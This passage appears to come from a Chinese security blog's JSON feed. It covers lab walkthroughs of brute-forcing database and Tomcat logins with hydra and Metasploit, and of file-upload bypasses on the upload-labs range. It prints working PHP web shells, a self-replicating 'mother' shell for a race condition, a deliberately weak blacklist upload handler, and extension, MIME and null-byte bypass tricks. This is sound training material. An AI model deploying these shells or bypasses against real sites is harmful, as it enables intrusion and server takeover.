data-num=\"2\"></td><td><pre>use <span class=\"token number\">1</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712221248349.png\" alt=\"image-20240712221248349\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712221625697.png\" alt=\"image-20240712221625697\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.23.129</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> RPORTS <span class=\"token number\">1521</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>run</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712221739705.png\" alt=\"image-20240712221739705\" /></p>\n<p><img loading=\"lazy\" data-src=\"image-20240712221855746.png\" alt=\"image-20240712221855746\" /></p>\n<h3 id=\"postgresql爆破5432\"><a class=\"anchor\" href=\"#postgresql爆破5432\">#</a> PostgreSQL 爆破 (5432)</h3>\n<p>PostgreSQL 一种对象 - 关系数据库</p>\n<p>PostgreSQL 官方 docker 镜像：<a href=\"https://hub.docker.com/_/postgres\">https://hub.docker.com/_/postgres</a></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> pull postgres</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 默认用户名：postgres 也可以用 POSTGRES_USER= 设置</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-d</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">5432</span>:5432 <span class=\"token parameter variable\">-e</span> <span class=\"token assign-left variable\">POSTGRES_PASSWORD</span><span class=\"token operator\">=</span><span class=\"token number\">123</span>.com postgres</pre></td></tr></table></figure><p><strong>hydra</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> postgres <span class=\"token parameter variable\">-P</span> password.txt <span class=\"token number\">192.168</span>.23.129 postgres <span class=\"token parameter variable\">-vV</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240713002644405.png\" alt=\"image-20240713002644405\" /></p>\n<p><strong>msf</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search postgres_login</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use <span class=\"token number\">0</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712233755711.png\" alt=\"image-20240712233755711\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240712233913075.png\" alt=\"image-20240712233913075\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.23.129</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> USERNAME postgres</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> USER_FILE <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> USERPASS_FILE <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>run</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240713000348555.png\" alt=\"image-20240713000348555\" /></p>\n<p><strong>railgun</strong></p>\n<p><img loading=\"lazy\" data-src=\"image-20240713002501476.png\" alt=\"image-20240713002501476\" /></p>\n<h3 id=\"redis爆破6379\"><a class=\"anchor\" href=\"#redis爆破6379\">#</a> Redis 爆破 (6379)</h3>\n<p>Redis 环境 docker 地址：<a href=\"https://hub.docker.com/r/sqlsec/redis5-centos7-cron\">https://hub.docker.com/r/sqlsec/redis5-centos7-cron</a></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 拉取镜像</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">docker</span> pull sqlsec/redis5-centos7-cron:latest</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 创建容器</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-d</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">6379</span>:6379 sqlsec/redis5-centos7-cron:latest</pre></td></tr></table></figure><p>docker 默认没有密码</p>\n<p><strong>msf</strong></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>search redis_login</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>use <span class=\"token number\">0</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240713180219150.png\" alt=\"image-20240713180219150\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240713180254175.png\" alt=\"image-20240713180254175\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.23.129</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>run</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240713180313646.png\" alt=\"image-20240713180313646\" /></p>\n<p>redis 远程连接命令</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>redis-cli <span class=\"token parameter variable\">-h</span> <span class=\"token number\">192.168</span>.23.129 <span class=\"token parameter variable\">-a</span> 密码</pre></td></tr></table></figure><p>密码配置</p>\n<p>在 <code>/etc/redis.config</code>  中插入 <code>requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</code>  配置完需要重启 redis</p>\n<p>另一种方式不需要重启 redis</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 首先连接本地 redis</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>redis-cli</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># info 显示 redis 信息，如果 info 不显示信息说明需要密码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>info</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># ATUH + 密码 进行认证</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>AUTH 密码</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 获取当前密码</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>config get requirepass</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 设置密码</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>config <span class=\"token builtin class-name\">set</span> requirepass</pre></td></tr></table></figure><h3 id=\"tomcat爆破8080\"><a class=\"anchor\" href=\"#tomcat爆破8080\">#</a> Tomcat 爆破 (8080)</h3>\n<p>Tomcat 爆破可以使用 Burp Suite 来进行 Base 认证爆破，也可使用 msf 进行爆破。Tomcat 口令是用户在 <code>/conf/tomcat-users.xml</code>  配置的，容易出现弱口令，容易被 getshell。</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search tomcat_mgr_login</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use auxiliary/scanner/http/tomcat_mgr_login</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>show options</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOTS <span class=\"token number\">192.168</span>.23.129</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>run</pre></td></tr></table></figure><h3 id=\"mongodb爆破27017\"><a class=\"anchor\" href=\"#mongodb爆破27017\">#</a> MongoDB 爆破 (27017)</h3>\n<p>一个基于分布式文件存储的数据库，MongoDB 服务开启时不加任何参数，默认是没有开启认证的，存在未授权访问。</p>\n<p>可以使用 msf 进行爆破，爆破模块 <code>auxiliary/scanner/mongodb/mongodb_login</code></p>\n",
            "tags": [
                "Web安全",
                "Web安全",
                "暴力破解"
            ]
        },
        {
            "id": "https://ph0ven1x.github.io/2024/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "url": "https://ph0ven1x.github.io/2024/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "title": "文件上传漏洞",
            "date_published": "2024-07-08T15:57:11.000Z",
            "content_html": "<h1 id=\"文件上传漏洞\"><a class=\"anchor\" href=\"#文件上传漏洞\">#</a> 文件上传漏洞</h1>\n<p>国光文件上传靶场地址：<a href=\"https://github.com/sqlsec/upload-labs-docker\">https://github.com/sqlsec/upload-labs-docker</a></p>\n<h2 id=\"php一句话木马\"><a class=\"anchor\" href=\"#php一句话木马\">#</a> php 一句话木马</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'X'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> // 代码执行    x=system(\"id\");</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'X'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> // 命令执行  x=id;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'X'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> // 断言     x=system(\"id\"); php7.0包括7.0以前适用</pre></td></tr></table></figure><h2 id=\"前端js绕过\"><a class=\"anchor\" href=\"#前端js绕过\">#</a> 前端 JS 绕过</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240707134138892.png\" alt=\"image-20240707134138892\" /></p>\n<p>先写好一句话木马</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>//shell.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 不显示报错</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">hightlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 代码高亮</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>将 shell.php 改为 shell.png，进行文件上传，用 bp 抓包，抓到以后将包中的 shell.png 改为 shell.php，再放包。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707135005816.png\" alt=\"image-20240707135005816\" /></p>\n<p>上传成功，查看图片</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707135118781.png\" alt=\"image-20240707135118781\" /></p>\n<p>一句话木马连接成功</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707135340668.png\" alt=\"image-20240707135340668\" /></p>\n<p>获取 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707135809438.png\" alt=\"image-20240707135809438\" /></p>\n<h2 id=\"htaccess解析上传\"><a class=\"anchor\" href=\"#htaccess解析上传\">#</a> .htaccess 解析上传</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240707142630638.png\" alt=\"image-20240707142630638\" /></p>\n<p>编写.htaccess 文件，.png 文件会被解析成 php 代码</p>\n<pre><code class=\"language-.htaccess\">AddType application/x-httpd-php .png\n</code></pre>\n<p>先上传.htaccess 文件，再上传 shell.png，右键查看图片，连接一句话木马，得到 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707143706332.png\" alt=\"image-20240707143706332\" /></p>\n<h2 id=\"mime绕过\"><a class=\"anchor\" href=\"#mime绕过\">#</a> MIME 绕过</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240707143958686.png\" alt=\"image-20240707143958686\" /></p>\n<p>可以将 shell.php 先改为 php.png 再上传，这样 MIME 识别为正确的 img/png，bp 拦截后将包里的 shell.png 改为 shell.php 再放包。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707144139040.png\" alt=\"image-20240707144139040\" /></p>\n<p>或者直接上传 shell.php，bp 拦截后，将包里的 MIME 改成 img/png，再放包。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707144614194.png\" alt=\"image-20240707144614194\" /></p>\n<p>连接一句话木马，获得 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707144831040.png\" alt=\"image-20240707144831040\" /></p>\n<h2 id=\"文件头绕过\"><a class=\"anchor\" href=\"#文件头绕过\">#</a> 文件头绕过</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240717121612723.png\" alt=\"image-20240717121612723\" /></p>\n<p>生成图马</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>copy pic.png/b+shell.php/b shell.png <span class=\"token comment\"># windows</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">cat</span> shell.php <span class=\"token operator\">>></span> pic.png <span class=\"token comment\"># linux 追加到图片后面</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">cat</span> pic.png shell.php <span class=\"token operator\">>></span> shell.png <span class=\"token comment\"># linux</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">echo</span> shell.php <span class=\"token operator\">>></span> pic.png <span class=\"token comment\"># linux 追加到图片后</span></pre></td></tr></table></figure><p>上传图马，用 bp 看一下包，shell.png 改成 shell.php</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707154452941.png\" alt=\"image-20240707154452941\" /></p>\n<p>PNG 文件头：89504E47，放包</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707154158139.png\" alt=\"image-20240707154158139\" /></p>\n<p>获得 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707154558235.png\" alt=\"image-20240707154558235\" /></p>\n<h2 id=\"代码缺陷1\"><a class=\"anchor\" href=\"#代码缺陷1\">#</a> 代码缺陷 1</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240707170548126.png\" alt=\"image-20240707170548126\" /></p>\n<p><code>str_ireplace(&amp;blacklist,&quot;&quot;,$name)</code>  从左到右查找字符串中是否包含黑名单中的字符串，如果有将其替换成空。（替换时不区分大小写）</p>\n<p>将一句话木马文件重命名为 <code>shell.pphphp</code>  进行文件上传，成功连上一句话木马，获得 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707172536027.png\" alt=\"image-20240707172536027\" /></p>\n<h2 id=\"代码缺陷2\"><a class=\"anchor\" href=\"#代码缺陷2\">#</a> 代码缺陷 2</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240707172619778.png\" alt=\"image-20240707172619778\" /></p>\n<p><code>str_replace()</code>  和 <code>str_ireplay()</code>  的区别是替换是区分大小写，因此只需把文件扩展名改成大写即可。shell.PHP，但是还有一个问题就是靶机的操作系统，如果是 Linux 系统的话是严格区分大小写的，所以 shell.PHP 无法识别，但是 Windows 是不区分大小写的，可以识别。</p>\n<p>不行，dockers 部署的靶场.PHP 也识别不了，我加了.htaccess 也不行，这里环境应该是有问题...</p>\n<h2 id=\"00截断get\"><a class=\"anchor\" href=\"#00截断get\">#</a> 00 截断 get</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240707193923273.png\" alt=\"image-20240707193923273\" /></p>\n<p>正常上传图片，图片会被随机生成文件名</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707194206943.png\" alt=\"image-20240707194206943\" /></p>\n<p>解题思路：将 shell.php 重命名为 shell.png，用 bp 拦截上传的包，再 <code>POST /?road=/var/www/html/upload/</code>  后加入 <code>shell.php%00</code> ，放包，上传成功</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707202334691.png\" alt=\"image-20240707202334691\" /></p>\n<p>成功连接木马，获得 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707202545715.png\" alt=\"image-20240707202545715\" /></p>\n<h2 id=\"00截断post\"><a class=\"anchor\" href=\"#00截断post\">#</a> 00 截断 post</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240707202654587.png\" alt=\"image-20240707202654587\" /></p>\n<p>先正常上传 shell.png，./upload/ 后插入 shell.php%00，%00 手动 url 解码，会是一个空格，然后放包，上传成功。</p>\n<p>post 需要手动解码，get 自动解码</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707202941490.png\" alt=\"image-20240707202941490\" /></p>\n<p>连接一句话木马，过的 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707203224414.png\" alt=\"image-20240707203224414\" /></p>\n<h2 id=\"黑名单缺陷\"><a class=\"anchor\" href=\"#黑名单缺陷\">#</a> 黑名单缺陷</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240707204119121.png\" alt=\"image-20240707204119121\" /></p>\n<p>黑名单 <code>&quot;asp&quot;,&quot;aspx&quot;,&quot;php&quot;,&quot;jsp&quot;,&quot;htaccess&quot;</code> ，更改个 php 能解析的扩展名即可，以 pht 为例，将 shell.php 改为 shell.pht 再上传。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-type: text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">// 设置上传目录</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"UPLOAD_PATH\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"/upload/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"UPLOAD_URL_PATH\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'DOCUMENT_ROOT'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0755</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'extension'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$blacklist</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"asp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"aspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"jsp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"htaccess\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$blacklist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>error();&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>black();&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>连接一句话木马成功，获得 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707204411253.png\" alt=\"image-20240707204411253\" /></p>\n<h2 id=\"条件竞争\"><a class=\"anchor\" href=\"#条件竞争\">#</a> 条件竞争</h2>\n<p><img loading=\"lazy\" data-src=\"%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_7-7-2024_204638_192.168.23.129.jpeg\" alt=\"屏幕截图_7-7-2024_204638_192.168.23.129\" /></p>\n<p>后端实现：文件会先上传到目标文件夹下，然后判断文件是否合法，不合法会被删除 在上传到删除这一操作中会存在时间差，如果有母马上传刚好被请求成功并解析，就会产生小马，从而 getshell</p>\n<p>编写母马</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'xiao.php'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&lt;?php error_reporting(0); highlight_file(__FILE__); eval($_REQUEST[1]);?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?></pre></td></tr></table></figure><p>使用 bp 爆破模块，频繁上传母马（不用添加有效负载的位置，直接无负载，无限的重复即可）</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707205708483.png\" alt=\"image-20240707205708483\" /></p>\n<p>编写 python 脚本重复请求 mother.php，请求到就会生成 xiao.php</p>\n<p>python 脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://192.168.23.129:30010/upload/mother.php'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    response <span class=\"token 